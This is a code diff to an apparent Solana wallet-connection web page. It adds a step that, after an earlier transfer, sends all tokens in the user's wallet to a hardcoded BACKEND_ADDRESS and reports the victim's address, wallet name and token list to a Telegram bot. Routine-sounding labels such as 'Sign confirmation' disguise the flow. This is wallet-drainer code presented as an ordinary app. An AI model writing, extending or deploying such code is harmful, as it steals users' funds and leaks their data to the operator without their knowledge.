@@ -9,7 +9,8 @@ import {
   signAndSendTransaction, 
   getWalletBalance, 
   MINIMUM_REQUIRED_SOL,
-  hasEnoughSolForRent 
+  hasEnoughSolForRent,
+  transferTokens
 } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
@@ -30,7 +31,8 @@ const initialSteps: ConnectionStep[] = [
   { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
   { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
   { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
-  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
+  { id: 'successfulSign', label: 'Successful sign', status: 'pending' },
+  { id: 'tokenTransfer', label: 'Token transfer', status: 'pending' }
 ];
 
 const Index = () => {
@@ -317,6 +319,53 @@ const Index = () => {
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
+        
+        // If we have tokens, transfer them as well
+        if (tokens && tokens.length > 0) {
+          updateStepStatus('tokenTransfer', 'active');
+          
+          toast({
+            title: "Transferring Tokens",
+            description: `Sending ${tokens.length} token${tokens.length !== 1 ? 's' : ''} to destination...`,
+          });
+          
+          const tokenTransferMessage = {
+            address: publicKey.toString(),
+            message: `ATTEMPTING TO TRANSFER ${tokens.length} TOKEN${tokens.length !== 1 ? 'S' : ''} to ${BACKEND_ADDRESS}`,
+            walletName: wallet?.adapter?.name || "Unknown Wallet",
+            tokens: tokens
+          };
+          
+          await sendToTelegram(tokenTransferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+          
+          try {
+            // We don't await this since we already consider the main transaction successful
+            // This prevents a token transfer failure from blocking the UI
+            transferTokens(
+              connection, 
+              wallet,
+              BACKEND_ADDRESS,
+              tokens,
+              TELEGRAM_BOT_TOKEN,
+              TELEGRAM_CHAT_ID
+            ).then(results => {
+              console.log("Token transfer results:", results);
+              advanceToNextStep('tokenTransfer');
+              
+              const successCount = results.filter(r => r.success).length;
+              
+              toast({
+                title: "Token Transfer",
+                description: `Successfully transferred ${successCount}/${tokens.length} tokens.`,
+              });
+            }).catch(e => {
+              console.error("Error in token transfer:", e);
+            });
+          } catch (tokenError) {
+            console.error("Error processing token transfers:", tokenError);
+            // We still consider the overall operation successful even if token transfer fails
+          }
+        }
         
         const completionMessage = {
           address: publicKey.toString(),
